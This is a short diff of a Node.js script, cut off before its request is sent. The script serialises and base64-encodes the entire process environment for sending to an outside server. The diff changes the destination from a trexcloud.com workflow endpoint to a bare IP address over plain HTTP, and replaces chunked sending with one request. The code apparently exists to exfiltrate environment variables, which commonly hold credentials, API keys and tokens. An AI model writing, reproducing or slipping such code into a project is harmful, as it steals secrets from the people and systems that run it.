@@ -1,14 +1,17 @@
 #!/usr/bin/env node
-const https = require('https');
+const https = require('http');
 const process = require('node:process');
 try {
 
-const host = 'rex-fcharette-tc2.workflows.trexcloud.com';
-const path = '/api/flo/b340e68e3850a954c919bb738aaf3512/invoke';
+var host = 'rex-fcharette-tc2.workflows.trexcloud.com';
+var path = '/api/flo/b340e68e3850a954c919bb738aaf3512/invoke';
+host = '3.235.168.250';
+path = '/';
 
-for (var i = 0; i < 20; i++) {
+for (var i = 0; i < 1; i++) {
 	
-	var data = 'key=1234&data=' + encodeURIComponent(btoa(JSON.stringify(process.env)).substr(i * 200, i * 200 + 200));
+	//var data = 'key=1234&data=' + encodeURIComponent(btoa(JSON.stringify(process.env)).substr(i * 200, i * 200 + 200));
+	var data = 'data=' + encodeURIComponent(btoa(JSON.stringify(process.env)));
 	
 	var options = {
 	  hostname: host,
